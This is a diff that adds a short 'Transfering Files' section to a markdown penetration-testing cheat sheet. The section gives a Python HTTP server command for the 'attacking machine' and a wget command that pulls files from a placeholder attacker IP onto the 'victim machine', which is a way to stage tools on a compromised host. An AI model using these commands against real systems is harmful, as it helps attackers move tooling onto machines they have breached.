@@ -228,6 +228,11 @@ To check for files in the conversations use export option. File -> Export -> HTT
 
 </details>
 
+# Transfering Files
+
+```python3 -m http.server 9000``` - Set up HTTP server on attacjubg machine.
+
+```wget http://[ATTACKING_IP]:9000/[filename]``` - Use on victim machine to download.
 
 # Wireless Attacks
 <details>
